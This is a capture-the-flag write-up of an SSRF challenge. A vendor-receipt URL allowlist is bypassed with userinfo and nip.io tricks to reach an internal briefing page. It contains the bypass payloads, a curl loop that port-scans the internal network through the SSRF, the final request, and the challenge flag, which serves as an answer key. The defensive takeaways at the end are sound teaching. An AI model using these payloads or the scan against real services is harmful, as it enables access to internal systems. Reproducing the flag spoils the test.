# Relay Echo — Writeup

- **CTF:** DeadDrop CTF
- **Category:** Web
- **Points:** 500
- **Flag:** `AIT{r3l4y_3ch0_us3rinf0_sp00f_9d41}`
- **Target:** `http://20.244.105.226:8083`

## Challenge
> The city's emergency relay team published a small incident-replay console.
> After a replay finishes, it fetches an approved vendor status receipt. During
> last night's outage, an internal briefing was written up but never published.

Vulnerability class: **SSRF (Server-Side Request Forgery)** with a weak URL
allowlist, used to reach an internal-only page.

## Step 1 — Map the app
- `GET /` — a replay console. The "Start a replay" form does
  `POST /replays` with `incident` and a **`receipt_url`** field
  (default `http://status.relay.example/vendor/status`).
- A submitted replay returns `302 → /replays/<id>`, and the record page shows
  the worker's fetch result ("Worker output is retained with the job").

So the server fetches an attacker-influenced `receipt_url` → SSRF candidate.

## Step 2 — Find the internal target
Path probing of the public site:
```
/internal/briefing   → 403 Forbidden   (exists, but blocked externally)
```
A `403` (not `404`) means the page exists and is restricted to internal callers
— exactly the "internal briefing [that] was never published."

## Step 3 — Understand the URL filter
The form claims "Only vendor status receipts are accepted." Testing the filter
by watching for `302` (accepted) vs `400` (rejected):

| `receipt_url` | Result |
|---|---|
| `http://status.relay.example/vendor/status` | 302 ✅ |
| `http://127.0.0.1:8083/internal/briefing` | 400 ❌ |
| `http://status.relay.example@127.0.0.1:8083/internal/briefing` | **302 ✅** |
| `http://status.relay.example.127.0.0.1.nip.io:8083/...` | 302 ✅ |
| `https://status.relay.example/x` | 400 ❌ (http only) |

The validator only checks that the string **contains** `status.relay.example`.
The **userinfo trick** `http://status.relay.example@<real-host>/` satisfies the
check while the browser/`requests` library actually connects to `<real-host>`.

## Step 4 — Find the internal port
Pointing the SSRF at `127.0.0.1:8083` gave `Connection refused` — the public
`8083` is a proxy; the Flask app listens on a different internal port. The
worker error (`HTTPConnectionPool(host='127.0.0.1', port=...)`) leaks whether a
port is open, so I brute-forced common ports through the SSRF:

```bash
for port in 5000 8000 80 8080 3000 ... ; do
  loc=$(curl -s -c cj -b cj -X POST http://20.244.105.226:8083/replays \
      --data-urlencode "incident=RLY-104" \
      --data-urlencode "receipt_url=http://status.relay.example@127.0.0.1:$port/internal/briefing" \
      -o /dev/null -w "%{redirect_url}")
  curl -s -b cj "$loc" | grep -oE "AIT\{[^}]*\}"
done
```

**Port 5000** returned the briefing containing the flag.

## Final request
```
POST /replays
incident=RLY-104
receipt_url=http://status.relay.example@127.0.0.1:5000/internal/briefing
```
→ follow the `302` to `/replays/<id>` → the worker output is the internal
briefing, with the flag.

## Flag
```
AIT{r3l4y_3ch0_us3rinf0_sp00f_9d41}
```

## Key takeaways
- **Substring allowlists are not host validation.** Validate the parsed host
  exactly (`urlparse(url).hostname == "status.relay.example"`), not
  `"status.relay.example" in url`.
- `http://trusted@evil/` (userinfo) and `trusted.evil.nip.io` are the standard
  SSRF allowlist bypasses.
- A `403` vs `404` distinction reveals internal-only endpoints; SSRF error
  messages (connection refused vs. timeout vs. body) make great port scanners.
